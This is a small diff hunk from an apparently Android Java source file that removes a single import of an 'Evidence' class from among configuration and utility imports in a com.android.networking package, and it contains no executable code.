@@ -25,7 +25,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfAction;
 import com.android.networking.conf.Configuration;
 import com.android.networking.conf.ConfigurationException;
-import com.android.networking.evidence.Evidence;
+
 import com.android.networking.evidence.EvidenceType;
 import com.android.networking.file.Directory;
 import com.android.networking.util.Check;
